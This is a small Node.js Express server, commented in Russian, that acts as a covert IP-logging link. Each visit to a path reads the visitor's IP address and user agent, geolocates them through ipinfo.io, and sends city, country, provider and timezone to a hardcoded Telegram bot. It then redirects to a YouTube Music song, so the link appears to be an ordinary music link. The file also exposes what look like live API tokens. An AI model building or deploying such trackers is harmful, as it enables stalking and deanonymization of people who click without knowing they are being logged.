const express = require('express');
const axios = require('axios');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// 🔐 Telegram настройки
const TELEGRAM_TOKEN = '8045162630:AAEritxdtynKLUG2mr-C0TMIyc0UcDnlKNY';
const CHAT_ID = '1031226674';

app.get('/', (req, res) => {
    res.send('Сервер работает. Добавь /test в адресе, чтобы перейти на песню.');
});

app.get('/:id', async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'];

        const ipInfo = await axios.get(`https://ipinfo.io/${ip}?token=7a9eeeb48f8390`);
        const data = ipInfo.data;

        const log = {
            time: new Date().toISOString(),
            ip: ip,
            city: data.city,
            region: data.region,
            country: data.country,
            org: data.org,
            loc: data.loc,
            timezone: data.timezone,
            userAgent: userAgent
        };

        const logText = `
🥔 <b>Новый переход</b>
🌍 <b>IP:</b> ${log.ip}
📍 <b>Место:</b> ${log.city}, ${log.country}
🏢 <b>Провайдер:</b> ${log.org}
🕓 <b>Часовой пояс:</b> ${log.timezone}
📱 <b>User-Agent:</b>
${log.userAgent}
`;

        // Отправка в Telegram (с HTML форматированием)
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: logText,
            parse_mode: 'HTML'
        });

        // Лог в файл
        //fs.appendFileSync('log.txt', JSON.stringify(log) + '\n');

        // Редирект на песню
        res.redirect('https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK');
    } catch (err) {
        console.error('Ошибка:', err.message);
        res.redirect('https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK');
    }
});

app.listen(PORT, () => {
    console.log(`Сервер запущен на http://localhost:${PORT}`);
});
